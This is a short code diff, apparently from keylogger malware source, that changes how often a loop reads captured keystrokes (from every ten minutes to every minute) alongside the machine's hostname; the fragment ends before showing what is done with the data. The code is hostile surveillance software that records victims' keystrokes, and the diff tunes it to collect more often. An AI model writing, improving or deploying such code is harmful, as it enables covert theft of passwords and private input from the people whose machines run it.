@@ -362,7 +362,7 @@ def keylog_loop():
     keylogger = WindowsKeylogger()
     threading.Thread(target=keylogger.start, daemon=True).start()
     while running:
-        time.sleep(600)
+        time.sleep(60)  # 1 minute
         keys = keylogger.get_buffer()
         if keys:
             computer_name = socket.gethostname()
